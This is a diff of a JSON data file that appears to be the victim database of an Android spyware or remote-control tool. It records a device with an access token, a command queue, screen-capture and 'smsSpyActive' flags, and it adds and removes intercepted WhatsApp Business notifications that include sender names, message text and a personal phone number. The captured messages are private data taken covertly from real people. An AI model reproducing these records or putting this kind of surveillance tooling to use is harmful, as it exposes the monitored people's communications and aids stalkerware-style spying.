@@ -311,7 +311,7 @@
     "deviceName": "HP-SAYANG-4049",
     "ownerUsername": "GANANG",
     "token": "a70009f8a5d81c6b767372cdc0d6c979",
-    "lastSeen": 1775634170306,
+    "lastSeen": 1775634188122,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T06:28:11.035Z",
@@ -327,6 +327,46 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WA Business",
+        "sender": "𝙏𝙀𝘼𝙈 𝙉𝘼𝙓𝙍𝘼𝙏: Membalas Anda",
+        "content": "~ sppg kamboja: Cpm",
+        "time": "08/04 14:43",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775634188680
+      },
+      {
+        "appName": "WA Business",
+        "sender": "WhatsApp Business",
+        "content": "Sending file to 𝙏𝙀𝘼𝙈 𝙉𝘼𝙓𝙍𝘼𝙏",
+        "time": "08/04 14:42",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775634171598
+      },
+      {
+        "appName": "WA Business",
+        "sender": "WhatsApp Business",
+        "content": "Sending file to 𝙏𝙀𝘼𝙈 𝙉𝘼𝙓𝙍𝘼𝙏",
+        "time": "08/04 14:42",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775634171554
+      },
+      {
+        "appName": "WA Business",
+        "sender": "WhatsApp Business",
+        "content": "Sending file to 𝙏𝙀𝘼𝙈 𝙉𝘼𝙓𝙍𝘼𝙏",
+        "time": "08/04 14:42",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775634171519
+      },
+      {
+        "appName": "WA Business",
+        "sender": "WhatsApp Business",
+        "content": "Sending file to 𝙏𝙀𝘼𝙈 𝙉𝘼𝙓𝙍𝘼𝙏",
+        "time": "08/04 14:42",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775634171093
+      },
       {
         "appName": "WA Business",
         "sender": "WhatsApp Business",
@@ -4286,46 +4326,6 @@
         "time": "08/04 14:25",
         "pkg": "com.whatsapp.w4b",
         "receivedAt": 1775633114583
-      },
-      {
-        "appName": "WA Business",
-        "sender": "‎𝙏𝙀𝘼𝙈 𝙉𝘼𝙓𝙍𝘼𝙏 (9 pesan): Menyebut Anda",
-        "content": "~ ★: @⁨Naxrat⁩ woiiiiiooo cpm",
-        "time": "08/04 14:25",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775633112948
-      },
-      {
-        "appName": "WA Business",
-        "sender": "WA Business",
-        "content": "‎‎59 pesan dari 4 chat",
-        "time": "08/04 14:25",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775633112920
-      },
-      {
-        "appName": "WA Business",
-        "sender": "WA Business",
-        "content": "‎‎50 pesan dari 3 chat",
-        "time": "08/04 14:25",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775633112887
-      },
-      {
-        "appName": "WA Business",
-        "sender": "+62 856-2460-4911",
-        "content": "Permisi Azx",
-        "time": "08/04 14:25",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775633112860
-      },
-      {
-        "appName": "WA Business",
-        "sender": "WA Business",
-        "content": "‎‎56 pesan dari 4 chat",
-        "time": "08/04 14:25",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775633112290
       }
     ],
     "galleryPhotos": [],
